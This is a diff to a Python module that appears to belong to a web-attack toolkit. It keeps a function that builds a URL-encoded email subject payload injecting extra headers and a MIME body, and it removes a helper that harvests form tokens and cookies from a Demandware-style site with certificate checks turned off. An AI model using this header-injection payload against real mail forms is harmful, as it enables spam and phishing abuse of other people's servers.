@@ -1,17 +1,12 @@
-#-*- coding: utf-8 -*-
-
-
-__all__ = [
-    "email_subject_payload",
-    "get_dwcont_samples"
-]
-
-
 import requests
 import re
 import datetime
 
-from . import url_enc
+from ..common import urlencode1
+
+__all__ = [
+    "email_subject_payload",
+]
 
 
 def email_subject_payload(subject, added_headers, msg_body):
@@ -37,16 +32,4 @@ def email_subject_payload(subject, added_headers, msg_body):
              nl + nl + "--MyBoundary--" + nl + nl + "AAAABBBBB"
              )
 
-    return url_enc(pload)
-
-
-def get_dwcont_samples(u, p, a=(), n=100):
-    """Gathers dwcont values from a DW site for a number of requests"""
-
-    for i in range(n):
-        rn = requests.get(u, auth=a, verify=False)
-        token = re.search("(?:" + re.escape('form action="') + '.+?' + re.escape(p) + re.escape('/') + '?' + ")(.+?)\"", rn.text).group(1)
-        cookies = rn.cookies.get_dict()
-        time = datetime.datetime.strptime(rn.headers["date"], "%a, %d %b %Y %H:%M:%S %Z")
-
-        yield {"cookies": cookies, "form_token": token, "server_time": time, "local_time": datetime.datetime.now()}
+    return urlencode1(pload)
